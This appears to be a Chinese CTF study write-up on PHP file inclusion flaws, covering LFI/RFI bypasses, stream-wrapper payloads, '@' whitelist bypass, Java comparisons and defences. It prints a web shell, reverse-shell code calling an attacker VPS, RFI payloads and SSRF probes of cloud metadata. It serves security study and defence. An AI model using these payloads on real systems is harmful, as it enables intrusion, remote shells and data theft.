---
title: "PHP 文件包含漏洞知识总结"
date: 2026-10-25 01:01:08
categories:
  - "WebSecurity"
  - "文件包含"
tags:
  - "PHP"
  - "文件包含"
  - "LFI"
  - "漏洞总结"
disableNunjucks: true
---

> ⚠️ **安全声明**：本文档内容仅用于**授权靶场 / 自建环境学习**。对未经授权的任何系统进行文件包含、命令执行、反弹 Shell 等测试均属违法行为，请遵守法律法规。

---

## 一、基础概念

### 1.1 什么是文件包含漏洞
PHP 的 `include` / `include_once` / `require` / `require_once` 作用：**将目标文件的内容读取并当作 PHP 代码执行**。

| 函数 | 文件不存在时 | 备注 |
|---|---|---|
| `include` | 仅警告，脚本继续 | — |
| `require` | 致命错误，终止脚本 | — |
| `include_once` / `require_once` | 同 include/require | 只引入一次，避免重复加载 |

**漏洞成因**：**用户可控输入直接/拼接后传入 include/require，且未严格校验**。

```php
<?php
// 危险代码：$file 来自 GET 参数，用户可控
$file = $_GET['file'];
include($file);
?>
```

### 1.2 漏洞分类
| 类型 | 说明 | 现状 |
|---|---|---|
| **LFI** 本地文件包含 | 只能读取/包含服务器本地文件 | 绝大多数 CTF/靶场场景 |
| **RFI** 远程文件包含 | `allow_url_include=On`，可 include http/https 远程地址 | 新版 PHP 默认关闭，几乎绝迹 |

**漏洞本质**：用户控制了文件路径，攻击者可操纵路径指向非预期文件（读源码 → 读任意文件 → 代码执行）。

---

## 二、绕过机制详解（按防御限制分类）

### 2.1 黑名单过滤（过滤 `../`、`php://`、`/tmp` 等关键字）

#### ① 过滤 `../`（最常见）
```php
$file = str_replace('../', '', $_GET['file']);
```
绕过方式：
1. **双写绕过**：`....//` → 删除一组`../`剩下`../`
   ```
   ....//....//tmp/flag.txt
   ```
   > 前提：只替换一次。若递归替换 `while(strpos)` 则双写失效。
2. **URL 编码**：`..`=`%2e%2e`，`/`=`%2f`
   ```
   %2e%2e%2f%2e%2e%2ftmp%2fflag.txt
   ```
   原理：WAF 在 PHP 解码前检测，看不到 `.`。
3. **二次 URL 编码**：`%2e` 再编码为 `%252e`，PHP 两次解码还原。
4. **多斜杠**：`..//..//tmp/flag.txt`，Linux 自动合并多个 `/`。

#### ② 过滤伪协议 `php://`
绕过：大小写变形 `PHP://FILTER`、URL 编码 `php%3A//filter`、换行拆分。

### 2.2 open_basedir 限制（PHP.ini 目录锁）
> 只限制 PHP 文件流读取，**不限制 `system()` / `exec()` 等系统命令**。

| 绕过方式 | payload | 说明 |
|---|---|---|
| **php://filter**（最常用） | `php://filter/read=convert.base64-encode/resource=/tmp/flag.txt` | 读文件不执行代码 |
| 备选过滤器（filter 被拦） | `convert.iconv.UTF-8.UTF-16/resource=xxx` | 字符编码过滤器 |
| phar:// | `phar:///var/www/upload/xxx.jpg/test.php` | 需上传压缩包 |

> 核心思路：**直接读文件被拦 → 转代码执行 → `system('cat /tmp/flag.txt')`**，系统调用不受 open_basedir 管控。

### 2.3 自动追加后缀（代码拼接 `.php`）
```php
include($file . ".php");
```
- `%00` 空字节截断：**PHP >= 5.3.4 彻底失效**，不要再试。
- 现代绕过：LFI 转 RCE（日志 / session 包含）。

### 2.4 前置文件检测 `is_file()` / `file_exists()`
```php
if(is_file($file)){ include($file); }
```
绕过：`php://filter`、`php://input` 等伪协议对 `is_file()` 返回 true，可通过检测。

### 2.5 远程文件包含 RFI（`allow_url_include=On`）
```php
include($_GET['file']);
```
payload：`?file=http://xxx/evil.php`（加载远程恶意代码）。
> 默认 `allow_url_include=Off`，RFI 现在几乎遇不到。

### 2.6 LFI 转代码执行（LFI to RCE，核心利用链）
1. **日志文件包含**：把 PHP payload 写入日志（User-Agent/URL 参数），再 include 日志文件。
   ```
   ?file=/var/log/nginx/access.log
   ```
2. **Session 文件包含**：session 默认存 `/tmp/sess_xxxx`，写入一句话后包含。
3. **phar:// / 图片马**：上传压缩包/图片马后包含。

---

## 三、伪协议总表（场景 + RCE 能力 + 前置条件）

### 3.1 总表
| 伪协议 | 核心用途 | 是否可 RCE | 启用条件 | 关键说明 |
|---|---|---|---|---|
| **php://filter** | 读取文件源码 | ❌（只能读，不执行） | PHP 内置，无需 allow_url_include | CTF 最常用；base64/rot13 输出 |
| **php://input** | POST 传入 PHP 代码执行 | ✅ | `allow_url_include=On` | GET 传 `php://input`，POST body 放代码 |
| **data://** | URL 参数内嵌 PHP 代码 | ✅ | `allow_url_include=On` | 明文/base64 两种写法；WAF 高频拦截 |
| **file://** | 读取服务器本地文件 | ❌（只读不解析） | 内置，无需开关 | 读取 `/etc/passwd`、日志等文本 |
| **zip://** | 读取 zip 压缩包内文件 | ✅（间接） | zip 扩展，无需 allow_url_include | 需上传 zip 包；`#` 必须编码 `%23` |
| **compress.zlib://** | 读取 gz 压缩包（单文件） | ✅（间接） | zlib 扩展（默认自带） | gz 仅单文件，无 `#` |
| **compress.bzip2://** | 读取 bz2 压缩包（单文件） | ✅（间接） | bzip2 扩展（多数环境未开） | bz2 仅单文件，CTF 少考 |
| **phar://** | 读取 phar 包（zip 结构） | ✅（间接） | phar 扩展 | 用 `/` 分隔，不用 `%23` |

> **注意**：`phar://` 还涉及反序列化漏洞，与文件包含是两个独立考点，勿混淆。

### 3.2 逐个详解

#### 1. php://filter —— 读源码
```php
php://filter/read=convert.base64-encode/resource=flag.php
php://filter/read=string.rot13/resource=index.php
```
- **RCE**：❌ 只能读取内容，不执行代码。

#### 2. php://input —— POST 代码执行
- GET 参数：`php://input`
- POST raw body：`<?php system('id');?>`
- **RCE**：✅。WAF 容易拦截 `<?php`。

#### 3. data:// —— URL 内嵌代码
```php
data://text/plain,<?php system('id');?>
data:text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+Cg==
```
- **RCE**：✅。`data://` 是 WAF 重点黑名单，新版 PHP 限制多。

#### 4. file:// —— 读本地文本
```php
file:///etc/passwd
file:///tmp/flag.txt
```
- **RCE**：❌ 只读原始文本，不解析 php。

#### 5. zip:// —— 上传 zip 包执行
```php
zip:///var/www/upload/exp.jpg%23shell.php
```
- **RCE**：✅ 间接。代码放上传的 zip 包内。
- **坑点**：后端若 `str_replace('zip://','')`，`zip://../../../../tmp/flag.txt` 可被清理掉 `zip://` 变成路径穿越读文件——这是后端过滤缺陷绕过，**不是 zip 伪协议原生能力**。

#### 6. compress.zlib:// —— gz 包执行
```php
compress.zlib:///var/www/upload/shell.jpg
```
- **RCE**：✅ 间接。gz 只能单文件。

#### 7. compress.bzip2:// —— bz2 包执行
```php
compress.bzip2:///var/www/upload/shell.png
```
- **RCE**：✅ 间接。极少考。

#### 8. phar:// —— phar 包执行
```php
phar:///var/www/upload/exp.jpg/shell.php
```
- **RCE**：✅ 间接。
- **zip:// vs phar://**：zip 用 `%23`；phar 用 `/`。

### 3.3 按 RCE 能力分类
**✅ 能 RCE**：php://input、data://、zip://、compress.zlib://、compress.bzip2://、phar://、http://（RFI）
**❌ 仅读取**：php://filter、file://

### 3.4 做题快速选型
| 场景 | 选择 |
|---|---|
| 想读 php 源码 | **php://filter**（首选） |
| 无上传点，要执行代码 | php://input / data://（需 allow_url_include=On） |
| 有上传点、禁止 php 上传 | **zip://**（首选压缩伪协议） |
| 只读普通本地文件 | file:// |

### 3.5 重要坑点汇总
- `php://filter` **不需要** allow_url_include=On（高频考点）。
- `php://input` / `data://` **必须** allow_url_include=On。
- `zip://`/`zlib://`/`bzip2://` 不需要 allow_url_include，但需对应扩展。
- `zip://` 里的 `#` 在 URL 参数必须编码为 `%23`。

---

## 四、http:// 远程包含（RFI）

### 4.1 基础结论
- `http://` 属于 PHP 流包装器，但**不属于 LFI 常用伪协议**，归类为 **RFI 远程文件包含**。
- 是否 RCE：✅ 可以，但需同时开启 `allow_url_fopen=On` + `allow_url_include=On`。
- **原理**：PHP 通过 HTTP 请求拉取远程服务器文件内容，交给 include 当作 PHP 代码执行。
- **重点**：远程文件后缀无关，只要返回内容是 PHP 代码就会执行（`shell.txt`、`a.jpg` 均可）。

```php
/?file=http://你的VPSIP/shell.txt
```

### 4.2 命令执行（直接回显）
VPS 上 `shell.txt`：
```php
<?php system($_GET['cmd']); ?>
```
payload：
```
/?file=http://你的VPSIP/shell.txt&cmd=id
/?file=http://你的VPSIP/shell.txt&cmd=ls%20/
```
`%20` 是空格 URL 编码。

### 4.3 反弹 Shell（Linux 目标）
VPS 监听：`nc -lvnp 9999`
VPS 上 `rebound.txt`：
```php
<?php $ip="你的VPSIP"; $port=9999; $shell="/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"; system($shell); ?>
```
**备选（不依赖 bash）**：
```php
<?php $sock=fsockopen("你的VPSIP",9999); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

### 4.4 RFI 关键限制（现在 CTF 基本很难用）
1. `allow_url_include=Off`（新版默认），RFI 几乎绝迹。
2. WAF 拦截 `http://`、`https://`。
3. 目标服务器出网限制。
4. 远程返回内容可能被 URL 编码/缓冲/加 HTTP 头导致执行失败。

### 4.5 与 data://、php://input 对比
| 方式 | 代码位置 | 外部服务器 | 开启条件 |
|---|---|---|---|
| http:// | 另一台远程 web 服务器 | 需要 | allow_url_include=On + 出网 |
| data:// | URL 参数内 | 不需要 | allow_url_include=On |
| php://input | POST body | 不需要 | allow_url_include=On |

---

## 五、URL 白名单绕过（`@` 用户信息 + parse_url 解析差异）

### 5.1 `@` 符号原理
payload：`http://haobachang@xx.xx.xx.xx/xx.php`
> 此 `@` 是 **URL 标准语法 userinfo@host**（HTTP Basic Auth 用户名标记），**不是 PHP 错误抑制符**。

```
http://haobachang@192.168.1.100/xx.php
└─协议┘ └用户名┘└──真实目标IP──┘
```
- `haobachang`：HTTP Basic Auth 用户名，无业务作用。
- PHP `fopen/include/curl` 真正连接的是 **@ 后面的 IP**。

### 5.2 绕过根源
**校验逻辑只做字符串前缀匹配，没有 parse_url 提取 host；校验看到 @ 前白名单字符串，网络请求却访问 @ 后恶意 IP。**

```php
// ❌ 危险：前缀匹配，可被 @ 绕过
if(str_starts_with($url,"http://haobachang")){ include($url); }
```

**安全修复**（parse_url 取 host 严格比对）：
```php
$u = parse_url($url);
if(isset($u['host']) && $u['host'] === 'haobachang'){
    include($url);
}else{ die("非法地址"); }
```
> `parse_url` 会自动剥离 userinfo（@ 前用户名），直接拿到真实 host。

### 5.3 同类 URL 解析绕过 payload
```
http://haobachang@127.0.0.1/xxx.php
http://haobachang@192.168.1.100:8080/xxx.php
http://haobachang@fake@127.0.0.1/xxx.php   # 多层 @
http://haobachang\@127.0.0.1/xxx.php       # 反斜杠（旧 libcurl）
http://haobachang@2130706433/xxx.php       # 十进制 IP=127.0.0.1
http://haobachang@[::1]/xxx.php            # IPv6
http://haobachang@127.0.0.1/redirect.php   # 302 跳转
```
- **注意**：`#` 锚点会截断，`http://haobachang#@127.0.0.1` 大多无效，慎用。
- DNS 重绑定：注册 `haobachang` 域名，两次解析返回不同 IP（校验/请求），需自控域名，靶场少见。

### 5.4 该场景与 SSRF 的关系
- 绕过白名单后，include 发起 HTTP 请求，**天然附带 SSRF**。
- RFI 与 SSRF 可复用 payload：
  - 目标返回 php 代码 → **RFI 代码执行**
  - 目标返回普通文本（actuator、云元数据）→ **仅 SSRF 读取**
- **重要限制**：PHP 的 `http://` 包装器只支持 http/https，**不支持 gopher、dict**（无法打 Redis），SSRF 能力弱于普通 curl。

SSRF 探测目标：
```
http://haobachang@127.0.0.1:80/index.php
http://haobachang@192.168.1.1:8080/actuator
http://haobachang@169.254.169.254/latest/meta-data   # 云元数据
```

---

## 六、Java Web 与 PHP 文件包含对比

### 6.1 核心区别
| 项目 | PHP(include) | Java JSP(`<jsp:include>`) | Java IO 路径遍历 |
|---|---|---|---|
| 核心能力 | 加载文件**自动执行 PHP 代码** | 仅包含 JSP 文件才执行；txt/日志只输出文本 | 只读取文件，**永不执行代码** |
| 伪协议 | php://filter、data://、phar:// 丰富 | 无原生伪协议 | 无 |
| 攻击链 | 易日志投毒 LFI→RCE | 很难 RCE，只有包含可控 jsp 才可能 | 只能读配置，不能拿 shell |
| 经典 payload | /tmp/flag.txt、php://filter | `../WEB-INF/web.xml` | `../../etc/passwd` |
| 推荐防御 | 白名单 / realpath | 白名单 + getCanonicalPath | 白名单 + getCanonicalPath |

### 6.2 JSP 文件包含
```jsp
<%
String page = request.getParameter("page");
%>
<jsp:include page="<%=page%>" />
```
```jsp
<c:import url="${param.file}" />   <!-- JSTL，支持 http 远程包含 -->
```
- 经典案例：Tomcat AJP 协议漏洞 CVE-2020-1938（幽灵猫）。
- **重要差异**：JSP `<jsp:include>` 只有后缀为 jsp 的文件才会被编译执行；包含 txt/日志只会输出文本，**很难像 PHP 直接日志投毒 RCE**。

### 6.3 Java 路径穿越（与文件包含易混淆）
```java
File f = new File("/opt/upload/", filename);  // 危险
```
- 只读取内容，不执行代码，严格来说是 **CWE-22 路径遍历/任意文件读取**。

### 6.4 Java 绕过与防御
绕过：双写 `....//`、反斜杠 `..\`、URL 编码、多斜杠。
防御（核心，getCanonicalPath 一次性解析全部 `../`）：
```java
File base = new File("/opt/upload/").getCanonicalFile();
File target = new File(base, filename).getCanonicalFile();
if(target.getPath().startsWith(base.getPath())){
    // 合法
}else{ // 非法 }
```
> 注意：必须对 base 和 target 都做 `getCanonicalFile()`。

---

## 七、防御方案（从差到优）

| 方案 | 代码/配置 | 评价 |
|---|---|---|
| ❌ 黑名单过滤 | `str_replace(array('../','php://'),'',$file)` | 绕过方式极多，只作辅助，不能为主 |
| ⚠️ 白名单 | `in_array($file,$allow_list)` | 安全可靠，但仅适用文件固定有限场景 |
| ⚠️ 前缀固定+规范化 | 固定 base_path + 过滤 `/ \ ..` | 有逃逸风险，不推荐单独用 |
| ⚠️ open_basedir | `open_basedir=/var/www/html:/tmp` | 纵深防御，非根治，RCE 后失效 |
| 🔥 **最安全：用户输入不参与文件路径** | 数字 ID 映射：`?id=1` → 后端映射固定文件 | 用户无法控制文件名，根治 |
| ✅ 固定目录+realpath 校验 | `realpath()` + `strpos` 判断是否在允许目录 | PHP 侧推荐 |
| ✅ 禁用危险配置 | `allow_url_include=Off`、`display_errors=Off` | 全局加固 |

**最安全核心设计**（PHP）：
```php
$map = [1=>'home.php', 2=>'about.php'];
$id = $_GET['id'];
if(isset($map[$id])){ include($map[$id]); }
```
**固定目录 + realpath 校验**（PHP）：
```php
$baseDir = realpath('/var/www/html/pages/');
$targetFile = realpath($baseDir . DIRECTORY_SEPARATOR . $_GET['file']);
if(strpos($targetFile, $baseDir) === 0){ include($targetFile); }else{ exit("非法"); }
```

---

## 八、实战案例分析（本靶场）

### 8.1 靶场环境
- 服务器：Apache/2.4.25 (Debian) + **PHP/5.6.40**
- 漏洞点：`?include=` 参数传入 `include()`（文件包含）
- 目标：读取本机 `/tmp/flag.txt`
- 规则：**只能包含以 `http://haobachang` 开头的 URL**（字符串前缀白名单）
- 提供：文件上传 + 文件包含输入框

### 8.2 错误 payload 分析
```
/?include=http://haobachang@127.0.0.1/../../../../tmp/flag.txt
```
**为什么失败**：`http://` 包装器发起的是 **HTTP 请求**，`URL 路径里的 ../ 交给 Apache Web 服务器解析**（Apache 自动规范化路径、丢弃 ../，且 web 根目录隔离，无法访问系统 `/tmp/flag.txt`）。
> `http://` RFI ≠ 本地文件包含！`http://xxx` 走网络，不能直接读操作系统本地文件；读本地文件要用 `file://`。

### 8.3 另一个错误 payload 分析
```
GET /?include={{urlenc(http://119.91.248.192:444/shell.txt&cmd=cat /tmp/flag.txt)}}
```
**两个硬错误**：
1. **`{{urlenc()}}` 是模板引擎语法**（Twig/Jinja2），不是 URL 编码，PHP 不识别，原样当作文件名。
2. **`&cmd` 不能写进 include 的值里**：`&` 是 GET 参数分隔符，`cmd` 是靶场 URL 的第二个参数；`$_GET['cmd']` 读取的是靶场 URL 的参数，不是 VPS 地址的参数。

**正确 payload**：
```
GET /?include=http://119.91.248.192:444/shell.txt&cmd=cat%20/tmp/flag.txt
```
shell.txt 内容：`<?php system($_GET['cmd']); ?>`

### 8.4 该靶场正确解题方向
1. **优先验证 RFI 是否可用**（`allow_url_include`）：
   ```
   /?include=http://example.com
   ```
   页面加载出内容 = RFI 可用；报"无法打开流" = RFI 不可用。
2. 若 RFI 不可用（PHP5.6 默认 Off），**大概率考点是 LFI（zip://）**——因为靶场提供了文件上传：
   - 写 `shell.php`：`<?php system($_GET['cmd']); ?>`
   - 打包为 zip，改名 `shell.png` 上传
   - 拿到文件名后：
   ```
   /?include=zip://upload/shell.png%23shell.php&cmd=cat%20/tmp/flag.txt
   ```
3. 结合 `http://haobachang` 白名单的 `@` 绕过思路（若后端是 curl 拉取）：
   - 构造 302 跳转到 `file:///tmp/flag.txt` 的服务，payload `/?include=http://haobachang`。

---

## 九、一句话速记

1. **读 php 源码** → `php://filter`（无需 allow_url_include）。
2. **无上传点执行代码** → `php://input` / `data://`（需 allow_url_include=On）。
3. **有上传点禁 php 后缀** → `zip://`（首选压缩伪协议）。
4. **读普通本地文件** → `file://`。
5. **http:// 是 RFI 不是传统伪协议**，需两个配置 + 出网，现几乎绝迹。
6. **直接读文件被拦 → 转代码执行**（system 命令不受 open_basedir 管控）。
7. **@ 绕过 = 校验看 @ 前字符串，请求走 @ 后 IP**，必须 parse_url 取 host 修复。
8. **根治**：用户输入不参与文件路径（数字 ID 映射 / 严格白名单 + realpath / getCanonicalPath）。
